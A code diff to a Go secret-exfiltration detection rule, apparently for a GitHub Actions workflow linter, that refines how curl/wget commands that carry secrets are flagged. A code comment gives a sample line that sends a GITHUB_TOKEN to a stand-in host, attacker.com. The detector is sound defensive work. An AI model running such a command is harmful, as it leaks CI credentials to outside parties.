@@ -300,6 +300,24 @@ func (rule *SecretExfiltrationRule) isLegitimateUse(script string) bool {
 	return false
 }
 
+// buildLogicalCommand joins a line and its shell line-continuation lines
+// (lines ending with '\') into a single logical command string.
+// This is used to check legitimate patterns even when the URL is on a
+//
+//	continuation line (e.g., curl -H "Auth: ${{ secrets.TOKEN }}" \
+//	                              "https://api.github.com/...").
+func buildLogicalCommand(lines []string, startIdx int) string {
+	var parts []string
+	for i := startIdx; i < len(lines); i++ {
+		parts = append(parts, lines[i])
+		trimmed := strings.TrimRight(lines[i], " \t")
+		if !strings.HasSuffix(trimmed, "\\") {
+			break
+		}
+	}
+	return strings.Join(parts, " ")
+}
+
 // detectExfiltrationPatterns analyzes the script for exfiltration patterns
 func (rule *SecretExfiltrationRule) detectExfiltrationPatterns(script string, runStr *ast.String, envSecrets map[string]string) []exfiltrationPattern {
 	var patterns []exfiltrationPattern
@@ -309,7 +327,10 @@ func (rule *SecretExfiltrationRule) detectExfiltrationPatterns(script string, ru
 	lineOffset := 0
 
 	for lineIdx, line := range lines {
-		linePatterns := rule.analyzeLine(line, runStr, lineIdx, lineOffset, envSecrets)
+		// Build the logical command (joining shell line continuations) for
+		// legitimate pattern matching across multi-line curl commands.
+		logicalCmd := buildLogicalCommand(lines, lineIdx)
+		linePatterns := rule.analyzeLine(line, logicalCmd, runStr, lineIdx, lineOffset, envSecrets)
 		patterns = append(patterns, linePatterns...)
 		lineOffset += len(line) + 1 // +1 for newline
 	}
@@ -317,8 +338,59 @@ func (rule *SecretExfiltrationRule) detectExfiltrationPatterns(script string, ru
 	return patterns
 }
 
+// isSecretAsUrlArg returns true when the secret reference appears to be the
+// URL positional argument of a curl/wget command rather than the value of a
+// data/header flag.
+//
+// Example of a URL positional arg (should NOT flag):
+//
+//	curl -d "$PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }}
+//
+// Example of a flag value (SHOULD flag):
+//
+//	curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" attacker.com
+func (rule *SecretExfiltrationRule) isSecretAsUrlArg(line string, secretRef string, cmd networkCommand) bool {
+	if len(cmd.dataFlags) == 0 {
+		return false
+	}
+
+	secretIdx := strings.Index(line, secretRef)
+	if secretIdx == -1 {
+		return false
+	}
+
+	cmdIdx := strings.Index(line, cmd.name)
+	if cmdIdx == -1 || cmdIdx >= secretIdx {
+		return false
+	}
+
+	between := line[cmdIdx+len(cmd.name) : secretIdx]
+
+	for _, flag := range cmd.dataFlags {
+		flagIdx := strings.LastIndex(between, flag)
+		if flagIdx == -1 {
+			continue
+		}
+		afterFlag := strings.TrimLeft(between[flagIdx+len(flag):], " \t=")
+		if afterFlag == "" {
+			return false
+		}
+		if strings.HasPrefix(afterFlag, `"`) {
+			if !strings.Contains(afterFlag[1:], `"`) {
+				return false
+			}
+		} else if strings.HasPrefix(afterFlag, `'`) {
+			if !strings.Contains(afterFlag[1:], `'`) {
+				return false
+			}
+		}
+	}
+
+	return true
+}
+
 // analyzeLine analyzes a single line for exfiltration patterns
-func (rule *SecretExfiltrationRule) analyzeLine(line string, runStr *ast.String, lineIdx, lineOffset int, envSecrets map[string]string) []exfiltrationPattern {
+func (rule *SecretExfiltrationRule) analyzeLine(line string, logicalCmd string, runStr *ast.String, lineIdx, lineOffset int, envSecrets map[string]string) []exfiltrationPattern {
 	var patterns []exfiltrationPattern
 
 	// Skip comment lines
@@ -333,8 +405,9 @@ func (rule *SecretExfiltrationRule) analyzeLine(line string, runStr *ast.String,
 			continue
 		}
 
-		// Skip if line matches legitimate patterns for this command
-		if rule.matchesLegitPattern(line, cmd) {
+		// Skip if the logical command (including shell line continuations)
+		// matches a known-legitimate destination for this command.
+		if rule.matchesLegitPattern(logicalCmd, cmd) {
 			continue
 		}
 
@@ -342,6 +415,11 @@ func (rule *SecretExfiltrationRule) analyzeLine(line string, runStr *ast.String,
 		// Only detect if both the command and secret are on the same line
 		secretRefs := rule.findSecretRefsInLine(line)
 		for _, secretRef := range secretRefs {
+			// Skip secrets that appear to be the URL positional argument.
+			if rule.isSecretAsUrlArg(line, secretRef, cmd) {
+				continue
+			}
+
 			pos := rule.calculatePosition(runStr, lineIdx, lineOffset, line, secretRef)
 			severity := "high"
 			if cmd.isHighRisk && rule.hasDataFlag(line, cmd) {
@@ -522,7 +600,9 @@ func (rule *SecretExfiltrationRule) isEnvVarUsedAsURL(line, envName string, cmd 
 		}
 	}
 
-	// Check if any payload flag appears before the env var in the line.
+	// Check if any payload flag's value is still "open" at the env var position.
+	// A payload flag whose quoted value is closed before varIdx means the env var
+	// is a separate positional argument (the URL destination), not the payload.
 	for _, flag := range cmd.dataFlags {
 		if headerFlags[flag] {
 			continue // already handled above
@@ -530,13 +610,31 @@ func (rule *SecretExfiltrationRule) isEnvVarUsedAsURL(line, envName string, cmd 
 		re := regexp.MustCompile(regexp.QuoteMeta(flag) + `(?:\s|=)`)
 		matches := re.FindAllStringIndex(line, -1)
 		for _, match := range matches {
-			if match[0] < varIdx {
-				return false // env var is after a payload flag
+			if match[0] >= varIdx {
+				continue // flag is after env var, irrelevant
 			}
+			// Flag appears before env var. Check whether its value is still open
+			// (unclosed quote) at the env var position.
+			afterFlag := strings.TrimLeft(line[match[1]:varIdx], " \t")
+			if afterFlag == "" {
+				// Flag marker immediately precedes env var (unquoted positional).
+				return false
+			}
+			if strings.HasPrefix(afterFlag, `"`) {
+				if !strings.Contains(afterFlag[1:], `"`) {
+					return false // double-quoted value not closed at env var position
+				}
+			} else if strings.HasPrefix(afterFlag, `'`) {
+				if !strings.Contains(afterFlag[1:], `'`) {
+					return false // single-quoted value not closed at env var position
+				}
+			}
+			// Otherwise the flag's value is fully closed; the env var is a
+			// separate positional argument (URL destination).
 		}
 	}
 
-	// No payload flag precedes the env var, and env var is not in a header value.
+	// No open payload flag precedes the env var, and env var is not in a header value.
 	return true
 }
 
